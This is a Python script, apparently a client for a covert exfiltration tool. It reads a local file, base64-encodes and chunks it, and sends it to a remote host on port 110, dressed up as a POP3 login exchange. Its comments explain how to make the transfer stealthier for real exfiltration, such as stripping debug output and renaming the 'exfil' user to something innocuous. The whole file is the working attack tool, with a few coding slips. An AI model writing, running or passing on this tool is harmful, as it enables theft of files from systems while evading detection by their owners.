#!/usr/bin/env python3

import sys
import time
import zlib
import socket
import base64


# Configurations
port = 110
conns = 5

# Globals
MAX_SIZE = 4000
#CHUNK = 256
ERR = 1
OKAY = 0

#actually getting the file. Remove write() for exfiltration
def get_file(file_name):
    try:
        f = open(file_name, "rb")
        f_content = f.read()
        f.close()
    except (IOError, e) as variable:
        sys.stderr.write("[-] Error reading file %s.\n".format(variable))
        sys.exit(ERR)
    sys.stdout.write("[+] File is ready and is in memory.\n")
    return base64.b64encode(f_content), zlib.crc32(f_content)


def connect_to_server(host):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        sys.stdout.write("[+] Connected to the POP3 server.\n") #comment out for exfiltration
        return sock
    except (socket.error) as variable:
        sys.stderr.write("[-] Could not connect to server.\n%s\n".format(str(variable)))
        sys.exit(ERR)


def send_file(host, filename, CHUNK=256):
    b64_file, file_crc = get_file(filename)
    sock = connect_to_server(host)
    data = sock.recv(MAX_SIZE)
    if data.find("+OK POP3 service".encode()) == -1:
        #when used for exfiltration all non necessary write() statements and the exit(ERR) such as the one below should be removed 
        sys.stderr.write("[-] Server header did not match.\nHalting exfiltration.\n")
        sys.exit(ERR)
    #the for exfiltration change the user to something innocuous
    sock.send("USER exfil\n".encode('UTF-8'))
    data = sock.recv(MAX_SIZE)
    
    if data.find("+OK password required for user exfil".encode('UTF-8')) == -1:
        #remove for exfiltration, make detection harder but makes debugging easier
        sys.stderr.write("[-] Server did not accept the user. Something is wrong.\n")
        sys.exit(ERR)
    #print(b64_file.decode("utf-8")) used for debugging
    if CHUNK == None:
        CHUNK = 256
    #make all the packets
    all_data_packets = [b64_file[i:i+CHUNK] for i in range(0, len(b64_file), CHUNK)]
    #send the filename, crc32, packets_count, this_packet_count to server
    sock.send(base64.b64encode("%a;%a;%a;0".encode('UTF-8') % (filename, file_crc, len(all_data_packets)))) 
    #write() below needed only for debugging 
    sys.stdout.write("[+] Server passed auth and has received the header.\n")
    data = sock.recv(MAX_SIZE)
    if data.find("-ERR [AUTH] Authentication failed".encode('UTF-8')) == -1:
        sys.stderr.write("[-] Did not get confirmations for file content.\n")
        sys.exit(ERR)
    #sending the actual packets
    for i in range(len(all_data_packets)):
        sock.send("%a;%a".encode('UTF-8') % (i, all_data_packets[i]))
        time.sleep(0.1)
        data = sock.recv(MAX_SIZE)
        if data.find("-ERR [AUTH] Authentication failed".encode('UTF-8')) == -1:
            sys.stderr.write("[!] Error seding packet %s.\n" % i)
            break

    sock.send("0000".encode('UTF-8'))
    sock.close()
    #write() below needed only for debugging 
    sys.stdout.write("[+] Finished sending file. Closing socket.\n")
